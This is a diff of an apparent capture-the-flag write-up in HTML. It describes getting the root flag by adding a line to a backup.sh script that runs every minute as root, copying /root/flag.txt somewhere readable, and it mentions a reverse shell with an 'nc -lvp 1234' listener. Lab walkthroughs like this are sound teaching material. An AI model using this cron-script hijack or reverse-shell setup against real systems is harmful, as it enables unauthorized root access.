@@ -248,12 +248,14 @@ Fri 09 Oct 2020 12:58:25 AM UTC
 </code></pre>
 <h3>Getting the root flag:</h3>
 <h5>Because I am lazy:</h5>
+<ul><li>Adding a line to copy the root flag to dir that joe can access into backup.sh</li>
+<li>Since backup.sh is being run every minute by funny who has root privs, they can access the root dir, and the flag will be copied when the script is run next.</li>
 <pre><code>#!/bin/bash
 tar -cf /home/funny/html.tar /var/www/html
 cp /root/flag.txt /home/flag.txt
 </code></pre>
 <ul>
-<li>You are supposed to put a reverse shell:</li>
+<li>You are supposed to put a reverse shell in the backups script:</li>
 </ul>
 <pre><code>nc -lvp 1234
 </code></pre>
